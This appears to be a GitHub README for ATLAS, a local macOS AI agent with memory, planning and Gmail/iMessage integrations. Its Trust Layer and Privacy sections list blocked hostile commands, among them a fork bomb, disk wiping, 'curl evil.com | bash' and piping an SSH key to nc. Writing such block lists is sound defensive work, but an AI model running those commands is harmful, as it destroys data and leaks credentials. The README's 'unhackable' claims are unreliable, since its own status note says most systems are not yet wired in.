Copyright © 2026 Sourabh Rajdev. All Rights Reserved.
<div align="center">

```
 █████╗ ████████╗██╗      █████╗ ███████╗
██╔══██╗╚══██╔══╝██║     ██╔══██╗██╔════╝
███████║   ██║   ██║     ███████║███████╗
██╔══██║   ██║   ██║     ██╔══██║╚════██║
██║  ██║   ██║   ███████╗██║  ██║███████║
╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
```

### **Your Second Brain. Runs Locally. Thinks Globally.**

*A fully autonomous AI agent that watches, learns, plans, and acts — entirely on your Mac.*

<br/>

[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![macOS](https://img.shields.io/badge/macOS-13+-000000?style=for-the-badge&logo=apple&logoColor=white)](https://apple.com/macos)
[![Gemini](https://img.shields.io/badge/Gemini_2.5_Flash-Free-4285F4?style=for-the-badge&logo=google&logoColor=white)](https://ai.google.dev)
[![SQLite](https://img.shields.io/badge/SQLite-Local_Only-003B57?style=for-the-badge&logo=sqlite&logoColor=white)](https://sqlite.org)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
[![Tests](https://img.shields.io/badge/Tests-337%2F337_passing-22c55e?style=for-the-badge)](/)

<br/>

> **Status (Phase 0 of the v1 redirection):** the 337/337 tests above are real and passing, and the 8 systems below are genuinely built — but most of them are not yet wired into the live request path (e.g. RAG retrieval and the world model are not read into the prompt; multi-agent routing is keyword-based, not model-driven). See `ATLAS_V1_DIRECTION.md` for the honest claim-vs-code audit and the phased plan to wire them in.

<br/>

```
┌──────────────────────────────────────────────────────────────────┐
│  "The first AI assistant that genuinely knows you —              │
│   your habits, your goals, your calendar, your code —           │
│   and acts on that knowledge without leaving your machine."     │
└──────────────────────────────────────────────────────────────────┘
```

</div>

---

## What is ATLAS?

ATLAS is not a chatbot. It is not a wrapper around an API. It is a **fully autonomous, multi-system AI agent** that lives permanently on your Mac — understanding your digital life through 8 deeply integrated, independently testable systems:

```
  ╔═══════════════════════════════════════════════════════════════╗
  ║                     THE ATLAS STACK                          ║
  ╠═══════════════════════════════════════════════════════════════╣
  ║  8 ▸  Multi-Agent Coordination  →  6 specialist AI agents   ║
  ║  6 ▸  Self-Improvement Loop     →  learns from every week   ║
  ║  3 ▸  Long-Horizon Planning     →  Goal → Week → Task       ║
  ║  4 ▸  Integration Layer         →  Gmail · iMsg · Health    ║
  ║  2 ▸  Proactive Intelligence    →  surfaces signals quietly  ║
  ║  5 ▸  Production RAG            →  4-tier parallel recall   ║
  ║  1 ▸  World Model               →  typed knowledge graph    ║
  ║  T ▸  Trust Layer               →  unhackable hard limits   ║
  ╚═══════════════════════════════════════════════════════════════╝
```

**Everything runs on-device. Nothing private ever leaves your Mac.**

---

## Why ATLAS Exists

Every AI assistant today has the same fundamental problem: it forgets you the moment the chat ends. It doesn't know your goals. It can't see your screen. It won't remind you when a deadline is approaching. It doesn't get smarter the more you use it.

ATLAS fixes all of that.

| The old way | The ATLAS way |
|---|---|
| Stateless chat windows | Persistent memory across all sessions |
| You go to the AI | The AI comes to *you* when it matters |
| Forgets everything instantly | Builds a knowledge graph of your life |
| One LLM, one generic answer | 6 specialist agents collaborating |
| Cloud-dependent and opaque | 100% local, fully auditable |
| Same behavior forever | Learns from your feedback every week |

---

## Architecture

```
                        ┌──────────────────────────┐
                        │        You / CLI          │
                        └───────────┬──────────────┘
                                    │
                    ┌───────────────▼──────────────────┐
                    │           ORCHESTRATOR            │
                    │     (central nervous system)      │
                    └──┬──────────┬───────────┬────────┘
                       │          │           │
          ┌────────────▼──┐  ┌────▼─────┐  ┌─▼─────────────┐
          │  TRUST LAYER  │  │  ENGINE  │  │  PERCEPTION   │
          │  Hard limits  │  │ Gemini → │  │  0.5s screen  │
          │  Taint track  │  │ Groq  →  │  │  world state  │
          │  Audit log    │  │ Ollama   │  │  snapshots    │
          └───────┬───────┘  └────┬─────┘  └──────┬────────┘
                  │               │                 │
          ┌───────▼───────────────▼─────────────────▼────────┐
          │                   TOOL REGISTRY                   │
          │  Filesystem · Web · GitHub · System · Browser    │
          └──────────────────────────────────────────────────┘
                       │          │           │
        ┌──────────────▼─┐  ┌────▼──────┐  ┌─▼───────────────┐
        │  WORLD MODEL   │  │ RAG (4T)  │  │   PROACTIVE     │
        │  Knowledge     │  │ FTS5      │  │   ENGINE        │
        │  graph of your │  │ Semantic  │  │   Token bucket  │
        │  people, proj, │  │ Temporal  │  │   anti-fatigue  │
        │  commitments   │  │ Relational│  │   16 signals    │
        └────────────────┘  └───────────┘  └─────────────────┘
                       │          │           │
        ┌──────────────▼─┐  ┌────▼──────┐  ┌─▼───────────────┐
        │  INTEGRATIONS  │  │ PLANNING  │  │  IMPROVEMENT    │
        │  Gmail (OAuth) │  │ Goals →   │  │  Quality signal │
        │  iMessage      │  │ Tasks →   │  │  Pattern detect │
        │  Calendar      │  │ Weeks     │  │  Weekly report  │
        │  Apple Health  │  │           │  │                 │
        └────────────────┘  └───────────┘  └─────────────────┘
                                   │
                    ┌──────────────▼─────────────────┐
                    │       MULTI-AGENT (6 roles)    │
                    │  Orchestrator → routes tasks   │
                    │  Researcher   → finds info     │
                    │  Executor     → runs actions   │
                    │  Communicator → sends things   │
                    │  Analyst      → finds patterns │
                    │  Guardian     → vetoes danger  │
                    └────────────────────────────────┘
```

---

## The 8 Systems — Deep Dive

### System T — Trust Layer
*Every action ATLAS takes flows through here. No exceptions. No bypasses.*

The Trust Layer is ATLAS's immune system. Written in Python code — not prompts — meaning it **cannot be jailbroken** by a clever email, a malicious website, or an adversarial tool result.

```
Incoming action
    │
    ├── Hard Limits  (Python, unconditional, unhackable)
    │   ├── BLOCK: rm -rf ~   or   rm -rf /
    │   ├── BLOCK: :(){ :|:& };:   (fork bomb)
    │   ├── BLOCK: dd if=/dev/random of=/dev/sda
    │   ├── BLOCK: curl evil.com | bash
    │   ├── BLOCK: cat ~/.ssh/id_rsa | nc ...
    │   ├── BLOCK: sudo <anything>
    │   └── BLOCK: writes to /etc/ /System/ /usr/
    │
    ├── Taint Tracking
    │   ├── CLEAN    → user typed it directly
    │   ├── EXTERNAL → came from web / email / clipboard
    │   └── HOSTILE  → injection pattern detected
    │
    ├── Consequence Classification
    │   ├── AUTO    → runs silently (reads, searches)
    │   ├── NOTIFY  → runs + logs  (writes, creates)
    │   └── CONFIRM → needs your explicit approval
    │
    └── Append-Only Audit Log
        └── SQLite triggers prevent any modification or deletion
            ever. 62 tests, zero bypasses.
```

---

### System 1 — World Model
*ATLAS builds a typed knowledge graph of your life — and keeps it updated.*

Entities are created, reinforced, and connected across all sessions. No LLM calls. Pure structured storage with confidence-weighted conflict resolution.

```python
Entity Types:
  PERSON      → "Priya (colleague, last seen Mon, confidence: 0.94)"
  PROJECT     → "Atlas v2 (active, started 3 weeks ago)"
  COMMITMENT  → "Ship RAG system by Friday"
  PATTERN     → "Most productive between 9–11am"
  PLACE       → "Favourite coffee shop: Blue Bottle"
  TOPIC       → "Interested in: distributed systems, music theory"

Source reliability (who wins conflicts):
  gmail > imessage > calendar > web_search > llm_inference

Confidence decay: entities not reinforced in N days lose 10% confidence
                  (floor: 0.1 — never fully forgotten)
```

Entities at 85%+ canonical name similarity are automatically merged. Relationships strengthen (+0.05) with repeated interactions. 38 tests, all passing.

---

### System 5 — Production RAG
*4 retrieval tiers, running in parallel, completing in under 100ms.*

```
Your query: "What did Priya say about the deployment?"
     │
     ├──► Tier 1: FTS5 exact match              < 5ms  ──┐
     ├──► Tier 2: bge-small semantic vectors    < 50ms ──┤  merged,
     ├──► Tier 3: Temporal decay scoring        < 10ms ──┤  rescored,
     └──► Tier 4: Entity-linked (Priya graph)   < 20ms ──┘  returned

Final score = FTS×0.35 + Semantic×0.30 + Temporal×0.20 + Relational×0.15
```

**Context budget**: 4,000 tokens hard cap. Never exceeded.
- 40% → recent memories (last 24h)
- 30% → semantic best-matches
- 20% → relational/entity-linked
- 10% → temporal context

Memories with cosine similarity > 0.85, with 5+ near-duplicates, are automatically **consolidated** into a single extractive summary — keeping your memory store lean forever. 20 tests, all passing.

---

### System 2 — Proactive Intelligence
*ATLAS interrupts you only when it genuinely matters.*

Most AI assistants are purely reactive. ATLAS watches 16 signal types and surfaces the right ones at the right moment — using a **token bucket** to prevent notification fatigue.

```
Token Bucket: 10 tokens, replenishes 1 per hour

Signal Interrupt Cost:
  CRITICAL  (1 token) →  Battery dying, meeting NOW, system crash
  HIGH      (2 tokens) →  Urgent email, deadline today, build failed
  MEDIUM    (4 tokens) →  PR needs review, prep time needed
  LOW       (8 tokens) →  Stale commit, behavior insight, anomaly

ALWAYS bypass budget:  BATTERY_CRITICAL · MEETING_NOW · SYSTEM_ERROR_CRITICAL
NEVER interrupt when:  in_meeting · presenting · screen_sharing  →  queue
Batch mode: 3+ low-priority signals queued 15min → one grouped notification
Decay: LOW signal unacted 2h → archived. HIGH unacted 1h → escalated +0.2
```

| Category | Signals |
|----------|---------|
| Calendar | `MEETING_NOW` `CALENDAR_CONFLICT` `PREP_TIME_NEEDED` |
| Email | `EMAIL_URGENT` `EMAIL_ACTION_NEEDED` |
| Code | `COMMIT_STALE` `BUILD_FAILED` `PR_REVIEW_NEEDED` |
| System | `BATTERY_CRITICAL` `SYSTEM_ERROR_CRITICAL` |
| Planning | `DEADLINE_APPROACHING` `COMMITMENT_DUE` `TASK_BLOCKED` |
| Learning | `PATTERN_ANOMALY` `BEHAVIOR_INSIGHT` `USER_DEFINED` |

30 tests, all passing.

---

### System 4 — Integration Layer
*Real-world data, handled with real privacy.*

```
Gmail        →  OAuth2 + History API (delta sync — no full re-fetch)
iMessage     →  Read-only, local chat.db, WAL-safe, immutable=1 flag
Calendar     →  AppleScript with multi-format date parsing
Apple Health →  Local XML export analysis — never uploaded, ever
```

**Privacy enforcement**: iMessage content and health data are tagged `_local_only: True` at ingest. The taint tracking layer enforces this — they **cannot** reach cloud APIs even if a bug or injection tries to forward them.

```bash
/status
┌──────────────────┬──────────┬──────────────────────────────────┐
│ System           │ Status   │ Details                          │
├──────────────────┼──────────┼──────────────────────────────────┤
│ Integrations     │ healthy  │ gmail=healthy imessage=healthy   │
└──────────────────┴──────────┴──────────────────────────────────┘
```

49 tests, all passing.

---

### System 3 — Long-Horizon Planning
*From "I want to ship a product" to a concrete week-by-week plan in seconds.*

```
Goal: "Learn Rust and build a CLI tool"
  │
  ├── InferenceEngine detects: "learning" type (keyword scoring)
  │
  └── Auto-generates dependency-ordered tasks:
      1. Curate learning resources           30 min
      2. Study fundamentals — week 1          5 h   [needs 1]
      3. Apply with small practice project    3 h   [needs 2]
      4. Review and fill knowledge gaps       2 h   [needs 3]
      5. Build something real                 4 h   [needs 4]

WeeklyReplanner (runs Sunday night):
  ├── Carry forward incomplete HIGH/CRITICAL tasks
  ├── Fill week to 10h capacity (configurable)
  ├── Detect at-risk goals (no progress in 14+ days)
  └── Output: "Week 2026-W17 — 4 tasks, 8.5h, 1 at-risk goal ⚠"
```

Goal types auto-detected: `project` `learning` `writing` `fitness` `habit` `career` `travel`

Progress is calculated automatically from task completion ratios and persists across restarts. 50 tests, all passing.

---

### System 6 — Self-Improvement Loop
*ATLAS gets measurably better every week by observing itself.*

```
Quality signals recorded automatically during every session:

  ✗  task_duration_overrun   → task took 2x+ its estimate
  ✗  tool_error_spike        → a tool failing repeatedly
  ✗  user_correction         → you edited ATLAS's output
  ✗  negative_feedback       → you said "wrong" or "no"
  ✗  goal_abandoned          → a goal hit abandoned state
  ✓  positive_feedback       → you said "perfect" or "exactly"
  ✓  goal_completed          → a goal reached done state
  ✓  user_approval           → you explicitly approved an action

Pattern threshold: 3+ occurrences in 7-day rolling window → pattern identified

Weekly Report (auto-generated):
  Health Score: 78%  (positive signals / total signals)
  Issues found:
    → tool_error_spike × 5 in web_search
       Recommendation: "Check API limits or rate limiting"
    → user_correction × 4 in code_generation
       Recommendation: "Re-read instructions more carefully"
  Wins:
    ✓ positive_feedback × 11 on planning outputs
       "Keep this approach — users are responding well"
```

Weight adjustments use EMA (0.7 × old + 0.3 × new), clamped at ±0.4. 46 tests, all passing.

---

### System 8 — Multi-Agent Coordination
*Six specialist agents, one message bus, deterministic coordination.*

```
                      AgentCoordinator
                             │
              ┌──── MessageBus (async pub/sub) ────┐
              │              │                      │
    ┌─────────▼──────────┐   │        ┌─────────────▼──────────┐
    │   ORCHESTRATOR     │   │        │       GUARDIAN          │
    │   Decomposes req   │◄──┼───────►│  The ONLY agent that    │
    │   → routes to the  │   │  veto  │  can VETO others.       │
    │   right specialist │   │        │  Detects: delete, send, │
    └──────┬─────────────┘   │        │  purchase, publish...   │
           │                 │        └─────────────────────────┘
    ┌──────┼──────────┬───────────────┐
    │      │          │               │
┌───▼───┐ ┌▼───────┐ ┌▼──────────┐ ┌─▼─────────┐
│RESEAR-│ │EXECUT- │ │COMMUNIC- │ │ ANALYST   │
│CHER   │ │OR      │ │ATOR      │ │ Summaries │
│RAG+   │ │Approved│ │Drafts &  │ │ Trends    │
│web    │ │actions │ │sends     │ │ Insights  │
└───────┘ └────────┘ └──────────┘ └───────────┘

Messages: TASK_ASSIGN → TASK_RESULT → ESCALATE → VETO → BROADCAST
```

42 tests, all passing.

---

## Features at a Glance

```
PERCEPTION
  ✦ Live screen awareness (0.5s active poll, 5s when idle)
  ✦ Active app + window title + recent app history
  ✦ Automatic screenshots on focus change (privacy-gated)
  ✦ Blacklisted apps: 1Password, Keychain, and any you add

MEMORY
  ✦ Full-text search (FTS5) across all conversations
  ✦ Semantic search (384-dim bge-small, fully local, no API)
  ✦ Temporal snapshots — "what was I working on Tuesday?"
  ✦ Auto-importance scoring, deduplication, consolidation

EXECUTION
  ✦ Filesystem: read, write, delete, search, copy, move
  ✦ Web: search (Serper + DuckDuckGo fallback) + fetch
  ✦ GitHub: PRs, issues, commits, create issue, search repos
  ✦ System: open app, type text, press keys, clipboard, volume
  ✦ Vision: see screen, OCR text extraction, content analysis
  ✦ Browser: Playwright automation (optional, chromium)
  ✦ Shell: safe allowlisted commands (ls, cat, git, npm, pip...)

AUTONOMY
  ✦ Background loop: 30s cycles, learns from your patterns
  ✦ Three modes: passive / assistive / autonomous
  ✦ Signal scoring: urgency × confidence × priority × learned weight
  ✦ Adaptive scheduling with SQLite-persisted cron jobs

PRIVACY
  ✦ Zero cloud sync — all data in ~/.atlas/ SQLite files
  ✦ Append-only audit log (triggers block any tampering)
  ✦ rm root / fork bombs / credential theft → always blocked
  ✦ API keys stripped from all logs automatically
  ✦ iMessage + Health data: _local_only, never touches cloud
```

---

## Installation

### Requirements

- **macOS 13 Ventura** or later
- **Python 3.11+**
- A [Google AI Studio](https://aistudio.google.com) API key (free)

### Quick Start

```bash
# Clone
git clone https://github.com/SourabhRajdev/atlas.git
cd atlas

# Create virtual environment
python -m venv .venv
source .venv/bin/activate

# Install
pip install -e .

# Configure (minimum required)
echo "ATLAS_GEMINI_API_KEY=your_key_here" > .env

# Launch
atlas
```

### With Optional Capabilities

```bash
# Browser automation (Playwright)
pip install -e ".[browser]"
playwright install chromium

# Voice input/output (Whisper + ElevenLabs)
pip install -e ".[voice]"

# Local semantic search — strongly recommended
pip install -e ".[semantic]"

# File watching (FilesSource autonomy signal)
pip install -e ".[files]"

# Install everything
pip install -e ".[all]"
```

### Gmail Integration

```bash
# 1. Create OAuth2 credentials at console.cloud.google.com
# 2. Download credentials.json to your project root
# 3. Run the OAuth flow (opens browser)

python -c "
from pathlib import Path
from atlas.integrations.gmail import GmailIntegration
g = GmailIntegration(Path.home() / '.atlas', Path('credentials.json'))
g._get_service()
print('Done. Token saved to ~/.atlas/gmail_token.json')
"
```

---

## Configuration

All settings live in `.env` or macOS Keychain (preferred for API keys).

```bash
# ── LLM ──────────────────────────────────────────────────────────
ATLAS_GEMINI_API_KEY=AIza...        # Primary: Gemini 2.5 Flash (free)
ATLAS_GROQ_API_KEY=gsk_...          # Fallback: Groq llama-3.3-70b
# Ollama at localhost:11434 auto-detected as final offline fallback

ATLAS_MODEL=gemini-2.5-flash
ATLAS_MAX_TOKENS=8192

# ── Integrations ─────────────────────────────────────────────────
ATLAS_GITHUB_TOKEN=ghp_...          # GitHub API access (optional)
ATLAS_SERPER_API_KEY=...            # Better web search (optional)

# ── Behaviour ────────────────────────────────────────────────────
ATLAS_DEFAULT_MODE=assistive        # passive | assistive | autonomous
ATLAS_AUTONOMY_ENABLED=true
ATLAS_AUTONOMY_INTERVAL=30          # seconds between background cycles

# ── Storage ──────────────────────────────────────────────────────
ATLAS_DATA_DIR=~/.atlas             # where all SQLite databases live
```

**Store secrets in macOS Keychain instead of `.env`:**
```bash
security add-generic-password -a atlas -s ATLAS_GEMINI_API_KEY -w "AIza..."
security add-generic-password -a atlas -s ATLAS_GROQ_API_KEY -w "gsk_..."
```

---

## Usage

### CLI Commands

```
you ▸ /help

  /status           — all 8 system health checks in one table
  /cost             — session + all-time LLM cost breakdown
  /memories         — browse stored memories
  /remember <text>  — manually save a memory
  /search <query>   — semantic + full-text memory search
  /research <topic> — deep web research → saved as markdown
  /world            — current perception state (app, window, idle)
  /history          — recent screen snapshots timeline
  /mode [mode]      — show/set autonomy mode
  /pause [secs]     — pause perception for N seconds (default: 300)
  /log              — recent action log with tool names and tiers
  /capabilities     — granted macOS action capabilities
  /undo             — recent undo-able actions
  /voice            — push-to-talk voice input
  /voice continuous — always-listening voice mode
  /clear            — clear screen
  /new              — start a fresh session
```

### Example Sessions

```
you ▸ What should I be working on right now?

ATLAS ▸ Based on your week plan and current time (10:23 AM, Tuesday):

  Priority tasks for today:
  1. Review PR #47 from Priya — HIGH priority, 2 days waiting
  2. Finish the auth middleware write-up — deadline Friday
  3. Prep for 2PM sprint planning (37 minutes from now)

  Your last commit was 3 days ago. Want me to check what's
  changed and draft a status update?
```

```
you ▸ Plan my goal to learn machine learning

ATLAS ▸ Created: "Learn machine learning" (HIGH priority)
        Detected goal type: learning
        Auto-generated 5 tasks:

  1. Curate learning resources                   30 min
  2. Study fundamentals — week 1                  5 h    [after 1]
  3. Apply with small practice project            3 h    [after 2]
  4. Review and fill knowledge gaps               2 h    [after 3]
  5. Build something real                         4 h    [after 4]

  Estimated completion: 3.2 weeks at 2h/day focused work.
  At-risk check: none yet — you just started.
  Run /plan week to see this week's schedule.
```

```
you ▸ /status

  ╭──────────────────┬──────────┬────────────────────────────────╮
  │ System           │ Status   │ Details                        │
  ├──────────────────┼──────────┼────────────────────────────────┤
  │ Trust Layer      │ healthy  │ audit_entries=1,204            │
  │ World Model      │ healthy  │ entities=47  relations=89      │
  │ RAG (Production) │ healthy  │                                │
  │ Proactive Engine │ healthy  │ queue_size=2  sources=3        │
  │ Integrations     │ healthy  │ gmail=healthy imessage=healthy │
  │ Planning         │ healthy  │ active_goals=3  pending=11     │
  │ Self-Improvement │ healthy  │ signals_last_7d=34             │
  │ Multi-Agent      │ healthy  │ agents=6                       │
  ╰──────────────────┴──────────┴────────────────────────────────╯
```

---

## How ATLAS Processes a Request

```
1.  You type: "Draft a reply to Priya's email about the deployment"
              │
2.  CommandRouter: Tier-0 fast path? → No
              │
3.  Executor runs with Gemini 2.5 Flash
    ├── Tool call: gmail_get_messages   → fetch Priya's email
    │   └── TrustLayer: EXTERNAL taint applied to all results
    ├── Tool call: world_model_lookup   → who is Priya? (conf: 0.94)
    ├── Tool call: rag_search           → past context with Priya
    └── LLM synthesizes: context-aware draft reply
              │
4.  Response streamed to you with execution trace:
    [TOOL]  gmail_get_messages  → OK  (tier: AUTO)
    [TOOL]  rag_search          → 3 relevant memories found
    [DONE]  Draft ready
              │
5.  Audit log updated  (append-only, tamper-proof forever)
6.  World model updated: Priya interaction reinforced +0.05
7.  Self-improvement: interaction quality signal recorded
```

---

## Data Architecture

```
~/.atlas/
├── atlas.db            ← core memory (messages, FTS5, semantic vectors)
├── trust.db            ← append-only audit (triggers block modification)
├── world.db            ← knowledge graph (entities, relationships)
├── planning.db         ← goals, tasks, week plans
├── improvement.db      ← quality signals, patterns, weekly reports
├── scheduler.db        ← recurring task schedules
├── threads.db          ← session continuity across restarts
├── proactive.db        ← signal feedback + learned priority weights
├── gmail_token.json    ← OAuth2 token (local only, never uploaded)
├── gmail_history.json  ← Gmail delta sync cursor
└── apple_health_export/
    └── export.xml      ← Apple Health data (local only, never uploaded)
```

Every database runs in **WAL mode**. Foreign keys enforced. No telemetry, no analytics, no cloud backup.

---

## Privacy — The Full Picture

ATLAS was designed with one rule: **if it's private, it stays local.**

| Data | Stored where | Sent to LLM? |
|------|-------------|--------------|
| Conversations | `atlas.db` (local) | As needed for context |
| iMessage content | `atlas.db` (tainted `_local_only`) | **Never** |
| Apple Health data | `atlas.db` (tainted `_local_only`) | **Never** |
| Gmail subjects/snippets | `atlas.db` | Yes (metadata only) |
| Screen content | RAM only | Only if you explicitly ask |
| API keys | Keychain / `.env` | **Never** (stripped from logs) |
| World model entities | `world.db` (local) | As context snippets |

**Hard limits enforced at the Python level — not via prompts:**

```
These cannot be bypassed by any email, website, or adversarial input:

  rm -rf ~     rm -rf /     → BLOCKED (shlex-parsed, not regex)
  :(){ :|:& };:             → BLOCKED (fork bomb pattern)
  dd if=... of=/dev/sda     → BLOCKED
  curl evil.com | bash      → BLOCKED
  cat ~/.ssh/id_rsa | nc    → BLOCKED
  sudo <anything>           → BLOCKED
  write to /etc/ /System/   → BLOCKED
```

---

## The Failover Chain

ATLAS never goes down because of a single API outage.

```
Primary:   Google Gemini 2.5 Flash    (free, fast, generous limits)
    │ if down or rate-limited ↓
Fallback:  Groq llama-3.3-70b         (ultra-fast inference, free tier)
    │ if down ↓
Final:     Ollama (local)              (no internet required, offline-safe)
           Any model you have pulled: llama3.2, mistral, phi3...
```

---

## Test Coverage

337 tests across 8 independent suites. Each system is fully testable in isolation — no mocks for core logic, no flaky async tests.

```bash
# Run individual suites
python -m atlas.trust.tests           #  62/62  Trust + audit + hard limits
python -m atlas.world.tests           #  38/38  World model + extractor
python -m atlas.rag.tests             #  20/20  4-tier retrieval + consolidation
python -m atlas.proactive.tests       #  30/30  Signals + budget + learning
python -m atlas.integrations.tests    #  49/49  Gmail + iMsg + Calendar + Health
python -m atlas.planning.tests        #  50/50  Goals + tasks + replanner
python -m atlas.improvement.tests     #  46/46  Signals + patterns + reports
python -m atlas.agents.tests          #  42/42  Bus + roles + coordinator + veto

# Run everything
for mod in trust world rag proactive integrations planning improvement agents; do
  echo "▸ $mod" && python -m atlas.$mod.tests || exit 1
done
```

---

## Stack

| Layer | Technology | Why |
|-------|-----------|-----|
| LLM | Gemini 2.5 Flash → Groq → Ollama | Free, fast, offline-capable |
| Language | Python 3.11+ | asyncio-first, type-annotated |
| Storage | SQLite (WAL + FTS5, multiple DBs) | Local, zero-dependency, fast |
| Async | asyncio throughout | Non-blocking perception + tools |
| Embeddings | bge-small 384-dim (local) | No external embedding API needed |
| macOS | PyObjC (Cocoa, Quartz, AppServices) | Native screen + app access |
| Browser | Playwright (optional) | Industry-standard automation |
| Vision | RapidOCR + CoreGraphics | Local OCR, no cloud Vision API |
| UI | Rich | Beautiful terminal output |
| Voice | faster-whisper + ElevenLabs (optional) | On-device transcription |

---

## Roadmap

```
v0.2  (current)  ─── All 8 systems built · 337/337 tests passing
v0.3             ─── Voice-first interface (Whisper + ElevenLabs)
                     Natural language goal creation via voice
                     Calendar write access (event creation)
v0.4             ─── Plugin system (custom signal sources)
                     ATLAS local API server mode
                     iOS Shortcut integration
v0.5             ─── Multi-Mac sync (encrypted, peer-to-peer)
                     Team mode (shared world model, access-scoped)
v1.0             ─── Fully autonomous 8-hour task execution
                     Learns your complete workflow in 30 days
                     Optional local fine-tuned model
```

---

## Contributing

ATLAS has non-negotiable engineering standards:

- **No silent failures** — every error is logged with context
- **No new cloud dependencies** without strong justification
- **SQLite only** for persistence (one database per system)
- **`health_check()` on every system** returning `{"status": "healthy|degraded|down", ...}`
- **Tests before merge** — each system ships with its own test module

```bash
# Dev setup
git clone https://github.com/SourabhRajdev/atlas.git
cd atlas
python -m venv .venv && source .venv/bin/activate
pip install -e ".[all]"

# Verify everything passes before opening a PR
for mod in trust world rag proactive integrations planning improvement agents; do
  python -m atlas.$mod.tests || { echo "FAIL: $mod"; exit 1; }
done
echo "All 337 tests passing."
```

---

<div align="center">

```
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   Built for people who want an AI that actually       ║
║   knows them. Not a chatbot. Not a demo. An agent.    ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
```

**[GitHub](https://github.com/SourabhRajdev/atlas)** · **[Issues](https://github.com/SourabhRajdev/atlas/issues)** · **[Discussions](https://github.com/SourabhRajdev/atlas/discussions)**

<br/>

*ATLAS — Autonomous Task & Learning Agent System*

Copyright © 2026 Sourabh Rajdev. All Rights Reserved.

</div>
